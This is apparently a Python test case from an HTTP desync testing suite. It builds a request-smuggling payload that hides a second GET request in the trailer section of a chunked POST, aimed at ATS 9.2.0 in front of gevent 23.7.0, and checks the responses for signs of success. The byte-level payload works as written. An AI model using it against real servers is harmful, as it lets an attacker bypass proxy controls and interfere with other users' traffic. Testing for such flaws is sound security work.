"""
Test Case: Trailer Section Injection
Exploits HTTP desync vulnerability by injecting a smuggled request in the Trailer Section.
"""

import re
from typing import Dict, Any, Optional


# Test case metadata
METADATA = {
    "name": "Trailer Section Injection",
    "description": "Exploits desync by embedding a smuggled HTTP request in the Trailer Section of a chunked request",
    "proxy": "ATS 9.2.0",
    "backend": "gevent 23.7.0"
}


def build_payload(target_host: str = "localhost") -> bytes:
    """
    Build HTTP payload with chunked encoding and Trailer Section containing smuggled request.
    
    This payload exploits the desync between ATS 9.2.0 (which forwards Trailer Section without
    sanitization) and gevent 23.7.0 (which discards the first line of Trailer and parses the
    rest as a new HTTP request).
    
    Payload structure (RFC 7230 compliant chunked encoding):
    1. POST /path1 with Transfer-Encoding: chunked
    2. Chunk data: "hello" (5 bytes)
    3. Terminal chunk: 0\r\n
    4. Trailer Section (exploited):
       - Empty line \r\n (gevent discards this)
       - Smuggled GET /path2 request (gevent parses this as new request)
    
    Args:
        target_host: Target host for the request (default: localhost)
    
    Returns:
        Raw bytes of the payload with precise byte-level control
    """
    # Build payload with manual byte-level control
    # CRITICAL: Must use \r\n (CRLF) exactly as specified in RFC 7230
    
    payload_parts = [
        # Request line
        b"POST /path1 HTTP/1.1\r\n",
        
        # Headers
        b"Host: " + target_host.encode('utf-8') + b"\r\n",
        b"Transfer-Encoding: chunked\r\n",
        b"Trailer: X-Smuggled\r\n",
        b"\r\n",  # End of headers
        
        # Chunk 1: "hello" (5 bytes)
        b"5\r\n",
        b"hello\r\n",
        
        # Terminal chunk
        b"0\r\n",
        
        # Trailer Section (this is where the exploit happens)
        # According to RFC 7230, after the terminal chunk (0\r\n), there should be
        # trailer headers followed by \r\n to end the message.
        # 
        # However, gevent 23.7.0 has a bug: it discards the first line after 0\r\n
        # and treats the rest as a new HTTP request.
        #
        # Structure:
        # - \r\n (empty line - gevent discards this)
        # - GET /path2 HTTP/1.1\r\n... (gevent parses this as new request)
        
        b"\r\n",  # Empty line (will be discarded by gevent)
        
        # Smuggled request (will be parsed as new request by gevent)
        b"GET /path2 HTTP/1.1\r\n",
        b"Host: backend\r\n",
        b"\r\n"  # End of smuggled request
    ]
    
    return b"".join(payload_parts)


def analyze_result(response_bytes: bytes, backend_stdout: Optional[str] = None) -> Dict[str, Any]:
    """
    Analyze test results to detect HTTP desync vulnerability.
    
    This function counts:
    1. proxy_recognized_requests: Number of requests the proxy recognized (always 1 for this test)
    2. backend_recognized_requests: Number of requests the backend recognized (2 if smuggling succeeded)
    
    Args:
        response_bytes: Raw response bytes from proxy
        backend_stdout: Backend stdout logs (optional, for additional analysis)
    
    Returns:
        Analysis dictionary with vulnerability status
    """
    # Decode response
    response_text = response_bytes.decode('utf-8', errors='replace')
    
    # Proxy always recognizes exactly 1 request (the POST to /path1)
    proxy_recognized_requests = 1
    
    # Count HTTP responses in the proxy response
    # Each "HTTP/x.x" line indicates a response, which corresponds to a request
    http_response_pattern = r'HTTP/\d\.\d \d{3}'
    response_count = len(re.findall(http_response_pattern, response_text))
    
    # Backend recognized requests
    # If we get 2 responses, backend processed 2 requests (smuggling successful)
    # If we get 1 response, backend only processed the original request
    backend_recognized_requests = response_count
    
    # Check if /path2 was accessed (evidence of smuggling)
    smuggled_path_accessed = None
    if '/path2' in response_text or 'SMUGGLED' in response_text.upper():
        backend_recognized_requests = max(backend_recognized_requests, 2)
        smuggled_path_accessed = "/path2"
    
    # Additional check: if backend_stdout is available, look for evidence of 2 requests
    if backend_stdout:
        # Count occurrences of request lines in backend stdout
        get_path2_count = backend_stdout.count('GET /path2')
        post_path1_count = backend_stdout.count('POST /path1')
        
        if get_path2_count > 0:
            backend_recognized_requests = 2
            smuggled_path_accessed = "/path2"
    
    # Determine vulnerability status
    if backend_recognized_requests > proxy_recognized_requests:
        vulnerability_status = "CRITICAL - Smuggling Successful"
    else:
        vulnerability_status = "NOT_VULNERABLE"
    
    # Extract proxy status code (first response)
    status_match = re.search(http_response_pattern, response_text)
    if status_match:
        status_code_match = re.search(r'\d{3}', status_match.group(0))
        proxy_status = int(status_code_match.group(0)) if status_code_match else -1
    else:
        proxy_status = -1
    
    return {
        "test_case": METADATA["name"],
        "proxy": METADATA["proxy"],
        "backend": METADATA["backend"],
        "results": {
            "proxy_status": proxy_status,
            "proxy_recognized_requests": proxy_recognized_requests,
            "backend_recognized_requests": backend_recognized_requests,
            "smuggled_path_accessed": smuggled_path_accessed,
            "vulnerability_status": vulnerability_status
        }
    }
